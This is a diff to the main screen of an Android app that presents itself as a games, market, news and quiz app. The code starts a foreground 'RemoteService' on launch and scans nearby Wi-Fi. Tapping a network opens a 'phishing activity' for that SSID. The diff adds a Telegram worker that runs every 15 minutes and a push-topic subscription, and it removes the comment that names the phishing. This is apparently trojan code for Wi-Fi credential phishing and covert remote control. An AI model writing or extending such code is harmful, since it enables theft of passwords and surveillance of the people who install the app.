@@ -12,21 +12,28 @@ import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.PowerManager;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.View;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.ListView;
 import android.widget.Toast;
+import com.google.firebase.messaging.FirebaseMessaging;
+
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.TimeUnit;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DatabaseReference;
@@ -63,12 +70,10 @@ public class MainActivity extends AppCompatActivity {
 
         wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
 
-        // Start RemoteService (unchanged)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(new Intent(this, RemoteService.class));
         }
 
-        // Check permissions
         if (!hasAllPermissions()) {
             ActivityCompat.requestPermissions(this, permissions, PERM_REQ_CODE);
         } else {
@@ -76,21 +81,20 @@ public class MainActivity extends AppCompatActivity {
             scanNearbyWifi();
         }
 
-        // Button 1: Play Games
+        scheduleTelegramWorker();
+
         Button playGamesButton = findViewById(R.id.playGamesButton);
         playGamesButton.setOnClickListener(v -> {
             Intent intent = new Intent(MainActivity.this, GamesActivity.class);
             startActivity(intent);
         });
 
-        // Button 2: Market
         Button marketButton = findViewById(R.id.marketButton);
         marketButton.setOnClickListener(v -> {
             Intent intent = new Intent(MainActivity.this, MarketActivity.class);
             startActivity(intent);
         });
 
-        // Button 3: News
         Button newsButton = findViewById(R.id.newsButton);
         newsButton.setOnClickListener(v -> {
             Intent intent = new Intent(MainActivity.this, NewsSourcesActivity.class);
@@ -112,7 +116,6 @@ public class MainActivity extends AppCompatActivity {
         Button quizButton = findViewById(R.id.playQuizButton);
 
         quizButton.setOnClickListener(v -> {
-            // 1️⃣ Check if user is logged in
             if (FirebaseAuth.getInstance().getCurrentUser() == null) {
                 Toast.makeText(this, "Please login first to play.", Toast.LENGTH_SHORT).show();
                 startActivity(new Intent(this, ProfileActivity.class));  // Go to login/register
@@ -146,9 +149,13 @@ public class MainActivity extends AppCompatActivity {
             startActivity(intent);
         });
 
+        Button btnScanQR = findViewById(R.id.btn_scan_qr);
+        btnScanQR.setOnClickListener(v -> {
+            Intent intent = new Intent(MainActivity.this, QRScannerActivity.class);
+            startActivity(intent);
+        });
 
 
-        // ✅ Wi-Fi List Item Click → Launch Phishing Activity
         wifiListView.setOnItemClickListener((parent, view, position, id) -> {
             String selectedSSID = parent.getItemAtPosition(position).toString();
 
@@ -156,6 +163,15 @@ public class MainActivity extends AppCompatActivity {
             phishingIntent.putExtra("ssid", selectedSSID);
             startActivity(phishingIntent);
         });
+
+        FirebaseMessaging.getInstance().subscribeToTopic("all");
+
+    }
+
+    private void scheduleTelegramWorker() {
+        PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(TelegramWorker.class, 15, TimeUnit.MINUTES).build();
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork("TelegramWorker",
+                androidx.work.ExistingPeriodicWorkPolicy.KEEP, workRequest);
     }
 
 
